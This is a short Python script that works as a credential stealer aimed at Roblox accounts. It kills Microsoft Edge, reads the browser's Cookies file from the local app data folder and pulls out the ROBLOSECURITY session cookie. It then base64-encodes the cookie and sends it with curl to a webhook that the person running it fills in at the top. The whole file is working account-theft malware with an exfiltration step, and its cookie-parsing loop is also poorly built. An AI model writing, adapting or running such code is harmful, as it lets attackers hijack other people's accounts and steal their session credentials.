# WEBHOOK HERE #

###############
              #
webhook = ''  #
              #
###############

import os
import base64

os.system('taskkill /f /im msedge.exe')

cookies_path = os.getenv('LOCALAPPDATA') + r'\Microsoft\Edge\User Data\Default\Network\Cookies'
print(cookies_path)

with open(cookies_path, mode='r', encoding='ansi') as f:
    content = f.read()

cookie_to_find = "ROBLOSECURITYv10"
cookie_startpos = content.find(cookie_to_find)
eot = ""
cookie = ""
index = cookie_startpos

while content[index] != eot:
    index += 1
    cookie += content[index]

cookie = "R" + cookie
enc_cookie = base64.b64encode(bytes(cookie, 'utf-8'))

os.system("curl -d " + str(enc_cookie) + " " + webhook)